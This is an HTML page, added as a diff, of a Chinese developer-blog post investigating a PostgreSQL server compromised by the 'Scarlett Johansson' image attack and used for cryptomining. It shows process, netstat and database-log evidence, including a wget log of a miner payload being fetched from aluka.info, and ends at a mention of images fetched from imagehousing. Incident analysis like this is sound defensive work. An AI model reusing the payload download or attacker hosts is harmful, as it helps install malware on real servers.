@@ -1,0 +1,1130 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+<meta name="referrer" content="never">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="后端,">
+
+
+
+
+
+  <link rel="alternate" href="atom.xml" title="开发者博客 – IT技术 尽在开发者博客" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="&amp;#x80CC;&amp;#x666F;&amp;#x8FD1;&amp;#x671F;&amp;#x6709;&amp;#x670B;&amp;#x53CB;&amp;#x9047;&amp;#x5230;&amp;#x670D;&amp;#x52A1;&amp;#x5668;&amp;#x88AB;&amp;#x5F53;&amp;#x77FF;&amp;#x673A;&amp;#x7684;&amp;#x60C5;&amp;#x51B5;&amp;#xFF0C;&amp;#x60F3;&amp;#x8D77;&amp;#x4E4B;&amp;#x524D;&amp;#x6211;">
+<meta name="keywords" content="后端">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次 postgreSQL 斯嘉丽约翰逊注入攻击排查">
+<meta property="og:url" content="https://dev.newban.cn/7036283586793701406.html">
+<meta property="og:site_name" content="开发者博客 – IT技术 尽在开发者博客">
+<meta property="og:description" content="&amp;#x80CC;&amp;#x666F;&amp;#x8FD1;&amp;#x671F;&amp;#x6709;&amp;#x670B;&amp;#x53CB;&amp;#x9047;&amp;#x5230;&amp;#x670D;&amp;#x52A1;&amp;#x5668;&amp;#x88AB;&amp;#x5F53;&amp;#x77FF;&amp;#x673A;&amp;#x7684;&amp;#x60C5;&amp;#x51B5;&amp;#xFF0C;&amp;#x60F3;&amp;#x8D77;&amp;#x4E4B;&amp;#x524D;&amp;#x6211;">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://gitee.com/songjianzaina/juejin_p5/raw/master/img/42dd20edf64939aa67f26e00088770e8db36e3fb0ffcd78b2798d240f11fb192">
+<meta property="og:image" content="https://gitee.com/songjianzaina/juejin_p5/raw/master/img/4527d9ee8fa460263bd831720421c001e139e7730176ab2669c08d9d90962405">
+<meta property="og:image" content="https://gitee.com/songjianzaina/juejin_p5/raw/master/img/f9f4375bde3230c0c9ce2658a24c5410e2af525889fae99f40de2e1a2643aebb">
+<meta property="og:updated_time" content="2024-04-28T07:23:27.539Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="记一次 postgreSQL 斯嘉丽约翰逊注入攻击排查">
+<meta name="twitter:description" content="&amp;#x80CC;&amp;#x666F;&amp;#x8FD1;&amp;#x671F;&amp;#x6709;&amp;#x670B;&amp;#x53CB;&amp;#x9047;&amp;#x5230;&amp;#x670D;&amp;#x52A1;&amp;#x5668;&amp;#x88AB;&amp;#x5F53;&amp;#x77FF;&amp;#x673A;&amp;#x7684;&amp;#x60C5;&amp;#x51B5;&amp;#xFF0C;&amp;#x60F3;&amp;#x8D77;&amp;#x4E4B;&amp;#x524D;&amp;#x6211;">
+<meta name="twitter:image" content="https://gitee.com/songjianzaina/juejin_p5/raw/master/img/42dd20edf64939aa67f26e00088770e8db36e3fb0ffcd78b2798d240f11fb192">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+<!--谷歌广告验证代码-->
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-2626449904708114",
+          enable_page_level_ads: true
+     });
+</script>
+<!--谷歌广告验证代码-->
+
+
+
+  <link rel="canonical" href="https://dev.newban.cn/7036283586793701406.html">
+
+
+
+
+
+  <title>记一次 postgreSQL 斯嘉丽约翰逊注入攻击排查 | 开发者博客 – IT技术 尽在开发者博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">开发者博客 – IT技术 尽在开发者博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">开发者博客 – 科技是第一生产力</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="http://dev.newban.cn/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="https://dev.newban.cn/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://dev.newban.cn">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="开发者博客">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="开发者博客 – IT技术 尽在开发者博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">记一次 postgreSQL 斯嘉丽约翰逊注入攻击排查</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-11-30T16:56:26+08:00">
+                2021-11-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="&#x80CC;&#x666F;"><a href="#&#x80CC;&#x666F;" class="headerlink" title="&#x80CC;&#x666F;"></a>&#x80CC;&#x666F;</h3><p>&#x8FD1;&#x671F;&#x6709;&#x670B;&#x53CB;&#x9047;&#x5230;&#x670D;&#x52A1;&#x5668;&#x88AB;&#x5F53;&#x77FF;&#x673A;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x60F3;&#x8D77;&#x4E4B;&#x524D;&#x6211;&#x4E5F;&#x9047;&#x5230;&#x8FC7;&#x7C7B;&#x4F3C;&#x7684; case, &#x662F;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684; postgre &#x6570;&#x636E;&#x5E93;&#x88AB;&#x6CE8;&#x5165;&#x65AF;&#x5609;&#x4E3D;&#x7EA6;&#x7FF0;&#x900A;&#x56FE;&#x7247;&#x653B;&#x51FB;&#x4E86;&#xFF0C;&#x91CD;&#x65B0;&#x7FFB;&#x51FA;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x5206;&#x4EAB;&#x5F53;&#x65F6;&#x88AB;&#x653B;&#x51FB;&#x540E;&#x7684;&#x6392;&#x67E5;&#x5FC3;&#x5F97;&#x3002;</p>
+<p>&#x4ECA;&#x5929;&#x4E0B;&#x5348;(2018.08.11)&#x8FDE;&#x7EED;&#x6536;&#x5230;&#x4E86;&#x817E;&#x8BAF;&#x4E91;&#x6211;&#x7684;&#x670D;&#x52A1;&#x5668; CPU overload &#x62A5;&#x8B66;</p>
+<p><img src="https://gitee.com/songjianzaina/juejin_p5/raw/master/img/42dd20edf64939aa67f26e00088770e8db36e3fb0ffcd78b2798d240f11fb192" alt="CPU Overload.png"></p>
+<p>&#x767B;&#x5F55;&#x670D;&#x52A1;&#x5668;&#x4E00;&#x770B;, &#x6709;&#x4E2A; postgres user &#x8DD1;&#x7684;&#x8FDB;&#x7A0B; <code>./Ac2p018-0</code> &#x628A; CPU &#x5360;&#x6EE1;&#x4E86;&#xFF0C;&#x8FDB;&#x7A0B;&#x540D;&#x53CA;&#x8FD0;&#x884C;&#x4FE1;&#x606F;&#x5C24;&#x5176;&#x5947;&#x602A;, &#x80AF;&#x5B9A;&#x4E0D;&#x662F;&#x8FD0;&#x884C; postgre &#x6570;&#x636E;&#x5E93;&#x884D;&#x751F;&#x7684;&#x8FDB;&#x7A0B;&#x3002;</p>
+<p><img src="https://gitee.com/songjianzaina/juejin_p5/raw/master/img/4527d9ee8fa460263bd831720421c001e139e7730176ab2669c08d9d90962405" alt="Htop info"></p>
+<h3 id="&#x6392;&#x67E5;"><a href="#&#x6392;&#x67E5;" class="headerlink" title="&#x6392;&#x67E5;"></a>&#x6392;&#x67E5;</h3><p>&#x9996;&#x5148;&#x5E76;&#x6CA1;&#x6709;&#x6000;&#x7591;&#x662F;&#x88AB;&#x5F53;&#x77FF;&#x673A;&#x4E86;&#xFF0C;&#x60F3;&#x5148;&#x6392;&#x67E5;&#x4E0B;&#x8FD9;&#x4E2A;&#x8FDB;&#x7A0B;&#x7A76;&#x7ADF;&#x662F;&#x4EC0;&#x4E48;&#x73A9;&#x610F;&#x513F;&#x3002;</p>
+<p>&#x4E8E;&#x662F;&#x6839;&#x636E; top &#x547D;&#x4EE4;&#x4E2D;&#x7684; pid &#x5230; proc &#x76EE;&#x5F55;&#x4E0B;&#x67E5;&#x8BE2;&#x8FDB;&#x7A0B;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#xFF0C;&#x770B;&#x5230; <code>/proc/20619/stack</code> &#x4E0B;&#x770B;&#x5230;&#x6709;&#x4E00;&#x957F;&#x4E32;&#x7684;<br><code>[&lt;ffffffff81841ff2&gt;] entry_SYSCALL_64_fastpath+0x16/0x71</code><br>&#x4F3C;&#x4E4E;&#x77ED;&#x65F6;&#x95F4;&#x91CC;&#x53D1;&#x8D77;&#x5927;&#x91CF;&#x7684;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;(prepare)&#x5E76;&#x4E14;&#x8FD8;&#x5728;&#x4E0D;&#x65AD;&#x589E;&#x957F;&#x3002;</p>
+<p>&#x63A5;&#x7740; <code>cat /proc/20619/cmdline</code> &#x53D1;&#x73B0;&#x8BE5;&#x8FDB;&#x7A0B;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;&#x662F; <code>/var/lib/postgresql/9.5/main/Ac2p018-0</code> &#x8FD9;&#x4E2A;&#x574F;&#x5BB6;&#x4F19;&#xFF0C;&#x67E5;&#x770B;&#x53D1;&#x73B0;&#x8FD9;&#x662F;&#x4E2A;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#xFF0C;&#x770B;&#x4E0D;&#x51FA;&#x95EE;&#x9898;&#xFF0C;&#x731C;&#x6D4B;&#x548C; postgresql &#x6570;&#x636E;&#x5E93;&#x6709;&#x5173;&#xFF0C;&#x770B;&#x8D77;&#x6765;&#x4E0D;&#x50CF;&#x662F;&#x4EC0;&#x4E48;&#x6570;&#x636E;&#x5E93;&#x7EF4;&#x62A4;&#x811A;&#x672C;&#xFF0C;&#x7B2C;&#x4E00;&#x53CD;&#x5E94;&#x662F;&#x88AB;&#x6570;&#x636E;&#x5E93;&#x653B;&#x51FB;&#x4E86;&#xFF0C;&#x4E8E;&#x662F;&#x67E5;&#x770B; <code>/var/lib/postgresql/.bash_history</code> &#x548C; <code>/var/lib/postgresql/.psql_history</code> &#x8BD5;&#x56FE;&#x770B;&#x770B;&#x662F;&#x5426;&#x6709;&#x88AB;&#x767B;&#x5F55;&#x670D;&#x52A1;&#x5668;&#x624B;&#x52A8;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x7684;&#x75D5;&#x8FF9;&#xFF0C;&#x53D1;&#x73B0;&#x4E00;&#x6761;&#x8BB0;&#x5F55;&#x90FD;&#x6CA1;&#xFF0C;&#x663E;&#x7136;&#x662F;&#x88AB;&#x624B;&#x52A8;&#x6E05;&#x7A7A;&#x4E86;&#xFF0C;&#x66F4;&#x52A0;&#x786E;&#x5B9A;&#x662F;&#x88AB; hack &#x4E86;&#x3002;</p>
+<p>&#x62C5;&#x5FC3;&#x5DF2;&#x7ECF;&#x88AB;&#x62FF;&#x5230; root &#x6743;&#x9650;&#x4E86;&#xFF0C;&#x4E8E;&#x662F;&#x901A;&#x8FC7; <code>lastlog</code> &#x548C; <code>last</code> &#x67E5;&#x770B;&#x767B;&#x5F55;&#x72B6;&#x6001;&#xFF0C;&#x6240;&#x5E78;&#x4E4B;&#x524D;&#x7684; root &#x8D26;&#x6237;&#x7684; ip &#x90FD;&#x662F;&#x6211;&#x81EA;&#x5DF1;&#x7684;&#xFF0C;&#x53EA;&#x6709; postgres &#x8FD9;&#x4E2A;&#x8D26;&#x6237;&#x770B;&#x8D77;&#x6765;&#x6709;&#x5F02;&#x5E38;&#x3002;</p>
+<p>&#x867D;&#x7136;&#x677E;&#x4E86;&#x4E00;&#x53E3;&#x6C14;&#xFF0C;&#x4F46;&#x901A;&#x5E38;&#x9ED1;&#x5BA2;&#x4F1A;&#x4E60;&#x60EF;&#x5728;&#x9ED1;&#x5165;&#x670D;&#x52A1;&#x5668;&#x540E;&#x8FD0;&#x884C;&#x4E2A;<a href="/external_links/c344ded5df9b723c56fd44b857002cbf.html" target="blank" rel="noopener">&#x9006;&#x5411; shell</a> &#x4FBF;&#x4E8E;&#x66F4;&#x65B9;&#x4FBF;&#x5730;&#x767B;&#x5F55;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x540E;&#x7EED;&#x64CD;&#x4F5C;&#xFF0C;&#x4E8E;&#x662F;&#x6267;&#x884C; <code>netsta -nlp</code> &#x67E5;&#x770B;&#x662F;&#x5426;&#x5F02;&#x5E38;&#x7AEF;&#x53E3;&#x5904;&#x4E8E;&#x76D1;&#x542C;&#x72B6;&#x6001;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">shell&#x590D;&#x5236;&#x4EE3;&#x7801;ubuntu@VM-187-130-ubuntu:~$ netstat -nlp</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 127.0.0.1:8088          0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:5432            0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 :::8086                 :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 :::5432                 :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 :::25                   :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 :::8000                 :::*                    LISTEN      -</span><br><span class="line">udp        0      0 10.141.187.130:123      0.0.0.0:*                           -</span><br><span class="line">udp        0      0 127.0.0.1:123           0.0.0.0:*                           -</span><br><span class="line">udp        0      0 0.0.0.0:123             0.0.0.0:*                           -</span><br><span class="line">udp6       0      0 :::123                  :::*                                -</span><br><span class="line">Active UNIX domain sockets (only servers)</span><br><span class="line">Proto RefCnt Flags       Type       State         I-Node   PID/Program name    Path</span><br><span class="line">unix  2      [ ACC ]     STREAM     LISTENING     13116    -                   /var/lib/lxd/unix.socket</span><br><span class="line">unix  2      [ ACC ]     STREAM     LISTENING     2865755417 27056/systemd       /run/user/500/systemd/private</span><br><span class="line">unix  2      [ ACC ]     SEQPACKET  LISTENING     9722     -                   /run/udev/control</span><br><span class="line">unix  2      [ ACC ]     STREAM     LISTENING     19759    -                   /run/docker/libnetwork/e1b89d6cc808988f4fc021f7f162718968e2759cff24c59edb04804b61133503.sock</span><br></pre></td></tr></table></figure>
+
+<p>&#x672A;&#x89C2;&#x5BDF;&#x5230;&#x5F02;&#x5E38;, &#x7531;&#x6B64;&#x786E;&#x8BA4;&#x76EE;&#x524D;&#x670D;&#x52A1;&#x5668;&#x6682;&#x65F6;&#x5B89;&#x5168;&#xFF0C;&#x5F00;&#x59CB;&#x6DF1;&#x5165;&#x6316;&#x6398;&#x8FD9;&#x6B21;&#x88AB;&#x9ED1;&#x539F;&#x56E0;&#x3002;</p>
+<p>&#x7531;&#x4E8E;&#x770B;&#x5230;&#x662F; postgre &#x7528;&#x6237;&#x6267;&#x884C;&#x7684;&#x5F02;&#x5E38;&#x8FDB;&#x7A0B;&#xFF0C;&#x53EF;&#x80FD;&#x662F;&#x901A;&#x8FC7;&#x6570;&#x636E;&#x5E93;&#x67D0;&#x4E9B;&#x6F0F;&#x6D1E;&#x5BFC;&#x81F4;&#x53EF;&#x4EE5;&#x53CD;&#x5411;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x5230;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#x6267;&#x884C;&#x7A0B;&#x5E8F;&#xFF0C;&#x90A3;&#x4E48;&#x4E00;&#x5B9A;&#x4F1A;&#x6709;&#x76F8;&#x5173;&#x65E5;&#x5FD7;&#x3002;&#x4E8E;&#x662F;&#x63A5;&#x7740;&#x5230; <code>/var/lib/postgresql/9.5/main/pg_log</code> &#x4E0B;&#x67E5;&#x770B;&#x6570;&#x636E;&#x5E93;&#x65E5;&#x5FD7;&#xFF0C;&#x6293;&#x5230;&#x4E86;&#x51E0;&#x4E2A;&#x5947;&#x602A;&#x7684;&#x5730;&#x65B9;&#xFF1A;</p>
+<ol>
+<li>&#x6709;&#x4E00;&#x4E2A;&#x957F;&#x8FDE;&#x63A5;&#x6301;&#x7EED;&#x4ECE; <code>http://aluka.info/x6</code> &#x4E0B;&#x8F7D;&#x6587;&#x4EF6;&#xFF0C;</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">yaml&#x590D;&#x5236;&#x4EE3;&#x7801;5144 --2018-08-11 15:47:30--  http://aluka.info/x6</span><br><span class="line">5145 Resolving aluka.info (aluka.info)... 103.27.110.206</span><br><span class="line">5146 Connecting to aluka.info (aluka.info)|103.27.110.206|:80... connected.</span><br><span class="line">5147 HTTP request sent, awaiting response... 200 OK</span><br><span class="line">5148 Length: 2758655 (2.6M)</span><br><span class="line">5149 Saving to: &#x2018;xmm&#x2019;</span><br><span class="line">5150</span><br><span class="line">5151      0K .......... .......... .......... .......... ..........  1%  399K 7s</span><br><span class="line">5152     50K .......... .......... .......... .......... ..........  3%  601K 5s</span><br><span class="line">5153    100K .......... .......... .......... .......... ..........  5%  592K 5s</span><br><span class="line">5154    150K .......... .......... .......... .......... ..........  7% 1.69M 4s</span><br><span class="line">5155    200K .......... .......... .......... .......... ..........  9%  754K 4s</span><br><span class="line">5156    250K .......... .......... .......... .......... .......... 11%  422K 4s</span><br><span class="line">5157    300K .......... .......... .......... .......... .......... 12%  405K 4s</span><br><span class="line">5158    350K .......... .......... .......... .......... .......... 14%  179K 5s</span><br><span class="line">5159    400K .......... .......... .......... .......... .......... 16% 81.1K 8s</span><br><span class="line">5160    450K .......... .......... .......... .......... .......... 18% 35.1K 13s</span><br><span class="line">5161    500K .......... .......... .......... .......... .......... 20%  117K 13s</span><br><span class="line">5162    550K .......... .......... .......... .......... .......... 22% 86.3K 14s</span><br><span class="line">5163    600K .......... .......... .......... .......... .......... 24%  122K 14s</span><br><span class="line">5164    650K .......... .......... .......... .......... .......... 25%  169K 13s</span><br><span class="line">5165    700K .......... .......... .......... .......... .......... 27%  171K 13s</span><br><span class="line">5166    750K .......... .......... .......... .......... .......... 29% 93.8K 13s</span><br><span class="line">5167    800K .......... .......... .......... .......... .......... 31% 94.9K 13s</span><br><span class="line">5168    850K .......... .......... .......... .......... .......... 33%  101K 13s</span><br><span class="line">5169    900K .......... .......... .......... .......... .......... 35% 53.6K 14s</span><br><span class="line">5170    950K .......... .......... .......... .......... .......... 37% 94.3K 14s</span><br><span class="line">5171   1000K .......... .......... .......... .......... .......... 38% 77.0K 13s</span><br><span class="line">5172   1050K .......... .......... .......... .......... .......... 40% 73.6K 13s</span><br><span class="line">5173   1100K .......... .......... .......... .......... .......... 42% 97.2K 13s</span><br><span class="line">5174   1150K .......... .......... .......... .......... .......... 44%  130K 13s</span><br><span class="line">5175   1200K .......... .......... .......... .......... .......... 46%  194K 12s</span><br><span class="line">5176   1250K .......... .......... .......... .......... .......... 48%  173K 12s</span><br><span class="line">5177   1300K .......... .......... .......... .......... .......... 50%  109K 11s</span><br><span class="line">5178   1350K .......... .......... .......... .......... .......... 51% 82.9K 11s</span><br><span class="line">5179   1400K .......... .......... .......... .......... .......... 53%  134K 10s</span><br><span class="line">5180   1450K .......... .......... .......... .......... .......... 55%  106K 10s</span><br><span class="line">5181   1500K .......... .......... .......... .......... .......... 57%  188K 10s</span><br><span class="line">5182   1550K .......... .......... .......... .......... .......... 59% 51.4K 9s</span><br><span class="line">5183   1600K .......... .......... .......... .......... .......... 61% 54.6K 9s</span><br><span class="line">5184   1650K .......... .......... .......... .......... .......... 63% 86.8K 9s</span><br><span class="line">5185   1700K .......... .......... .......... .......... .......... 64%  160K 8s</span><br><span class="line">5186   1750K .......... .......... .......... .......... .......... 66% 97.9K 8s</span><br><span class="line">5187   1800K .......... .......... .......... .......... .......... 68%  153K 8s</span><br><span class="line">5188   1850K .......... .......... .......... .......... .......... 70%  127K 7s</span><br><span class="line">5189   1900K .......... .......... .......... .......... .......... 72%  117K 7s</span><br><span class="line">5190   1950K .......... .......... .......... .......... .......... 74% 63.8K 6s</span><br><span class="line">5191   2000K .......... .......... .......... .......... .......... 76%  119K 6s</span><br><span class="line">5192   2050K .......... .......... .......... .......... .......... 77% 67.1K 5s</span><br><span class="line">5193   2100K .......... .......... .......... .......... .......... 79% 98.0K 5s</span><br><span class="line">5194   2150K .......... .......... .......... .......... .......... 81%  127K 5s</span><br><span class="line">5195   2200K .......... .......... .......... .......... .......... 83%  105K 4s</span><br><span class="line">5196   2250K .......... .......... .......... .......... .......... 85% 99.6K 4s</span><br><span class="line">5197   2300K .......... .......... .......... .......... .......... 87% 76.9K 3s</span><br><span class="line">5198   2350K .......... .......... .......... .......... .......... 89%  162K 3s</span><br><span class="line">5199   2400K .......... .......... .......... .......... .......... 90%  153K 2s</span><br><span class="line">5200   2450K .......... .......... .......... .......... .......... 92%  239K 2s</span><br><span class="line">5201   2500K .......... .......... .......... .......... .......... 94%  160K 1s</span><br><span class="line">5202   2550K .......... .......... .......... .......... .......... 96%  191K 1s</span><br><span class="line">5203   2600K .......... .......... .......... .......... .......... 98%  118K 0s</span><br><span class="line">5204   2650K .......... .......... .......... .......... ...       100% 82.4K=24s</span><br><span class="line">5205</span><br><span class="line">5206 2018-08-11 15:47:54 (111 KB/s) - &#x2018;xmm&#x2019; saved [2758655/2758655]</span><br><span class="line">5207</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>&#x53D1;&#x73B0;&#x66F4;&#x65E9;&#x7684;&#x65E5;&#x5FD7;&#x91CC;&#xFF0C;&#x6709;&#x4E24;&#x4E2A;&#x8FDE;&#x63A5;&#x4ECE; <code>img1.imagehousing.com</code> &#x4E0B;&#x8F7D;&#x4E86;&#x4E24;&#x5F20;&#x56FE;&#x7247;, &#x5E76;&#x6210;&#x529F;&#x8BBE;&#x7F6E;&#x4E86; 777 &#x6743;&#x9650;</li>
+</ol>
